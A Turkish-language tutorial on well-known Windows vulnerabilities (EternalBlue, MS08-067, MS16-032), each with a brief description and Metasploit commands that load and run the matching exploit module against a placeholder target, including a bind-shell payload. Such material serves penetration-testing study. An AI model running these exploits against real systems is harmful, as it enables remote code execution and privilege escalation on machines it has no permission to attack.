Windows kerneli, Windows'un en temel bileşenidir. Bilgisayarın donanımı ve kaynakları ile doğrudan bağlantı kurarak işletim sisteminin işleyişini sağlar.

Bazen direkt olarak bu kernelde ortaya çıkan güvenlik açıkları olabilir.

Bunları tanesini inceleyelim.

Daha fazlasına [adresinden](https://github.com/SecWiki/windows-kernel-exploits) erişebilirsiniz.

### EternalBlue

EternalBlue, Microsoft'un Windows işletim sistemindeki bir güvenlik açığından yararlanır. ABD Ulusal Güvenlik Ajansı (NSA) tarafından geliştirilmiş, ancak daha sonra bir hacker grubu tarafından internete sızdırılmıştır.

2017 yılında dünya çapında yüz binlerce bilgisayarı etkileyen WannaCry fidye yazılımı saldırısı, EternalBlue aracından yararlandı.

Bu açık için metasploit modülü bulunur

```auto
msf > use exploit/windows/smb/ms17_010_eternalblue
msf exploit(ms17_010_eternalblue) > set rhost <IP>
msf exploit(ms17_010_eternalblue) > run
```

### MS08-067

MS08-067, Microsoft tarafından 2008 yılında yayınlanan bir güvenlik bültenidir. Bu bülten, Windows Server hizmeti'ndeki bir güvenlik açıklığını ele alır. Bu açık, bir saldırganın "Uzaktan Kod Yürütme" (RCE) saldırısı gerçekleştirmesine ve etkilenen sistem üzerinde tam kontrol ele geçirmesine izin verir.

Bu açık için bir metasploit modülü vardır

```auto
msf > use exploit/windows/smb/ms08_067_netapi
msf  exploit(ms08_067_netapi) > set RHOST <IP>
msf  exploit(ms08_067_netapi) > set payload windows/shell_bind_tcp
msf  exploit(ms08_067_netapi) > exploit
```

## MS16-032

MS16-032, Microsoft Windows'ta "İkincil Oturum Açma Hizmeti"nde bir güvenlik açığını gideren bir güvenlik güncelleştirmesidir. Bu açık, bir saldırganın yükseltilmiş ayrıcalıklar elde etmesine ve sistem üzerinde tam kontrol sağlamasına izin verebilir.

İkincil Oturum Açma Hizmeti, kullanıcıların birden fazla oturum açmasına ve farklı kimlik bilgileriyle farklı uygulamaları çalıştırmasına olanak tanır. Bu hizmetle ilgili bir bellek yönetimi hatası, bir saldırganın bu hizmeti kilitleyip sistem üzerinde yetkisiz kod çalıştırmasına izin verebilir.

[Daha fazla bilgi için tıklayın.](https://www.rapid7.com/db/modules/exploit/windows/local/ms16_032_secondary_logon_handle_privesc/)

```auto
msf > use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
msf exploit(ms16_032_secondary_logon_handle_privesc) > show targets
    ...
msf exploit(ms16_032_secondary_logon_handle_privesc) > set TARGET <target-id>
msf exploit(ms16_032_secondary_logon_handle_privesc) > show options
    ...
msf exploit(ms16_032_secondary_logon_handle_privesc) > exploit  
```
